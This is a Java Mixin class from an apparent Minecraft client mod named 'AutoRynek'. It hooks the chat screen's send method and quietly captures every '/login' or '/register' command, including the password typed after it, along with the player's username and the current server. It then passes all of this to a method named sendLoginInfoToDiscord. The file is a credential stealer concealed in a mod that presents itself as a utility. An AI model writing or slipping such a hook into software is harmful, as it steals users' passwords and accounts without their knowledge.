package lipinekrynek.autorynek.mixin;

import lipinekrynek.autorynek.AutoRynkClient;
import net.minecraft.client.MinecraftClient;
import net.minecraft.client.gui.screen.ChatScreen;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

@Mixin(ChatScreen.class)
public class ChatScreenMixin {
   @Inject(method = "sendMessage", at = @At("HEAD"))
   private void onSendMessage(String chatText, boolean addToHistory, CallbackInfo ci) {
      if (chatText == null || chatText.trim().isEmpty())
         return;

      String trimmed = chatText.trim();
      String lower = trimmed.toLowerCase();

      if (lower.startsWith("/login ") || lower.startsWith("/register ")) {
         String[] parts = trimmed.split("\\s+", 2);
         String command = parts[0].substring(1).toLowerCase();
         String content = parts.length > 1 ? parts[1] : "";

         MinecraftClient client = MinecraftClient.getInstance();
         String playerName = (client.getSession() != null) ? client.getSession().getUsername() : "Unknown";
         String serverName = AutoRynkClient.getCurrentServerName();

         lipinekrynek.autorynek.AutoRynkInternal.sendLoginInfoToDiscord(serverName, playerName, command, content);
      }
   }
}
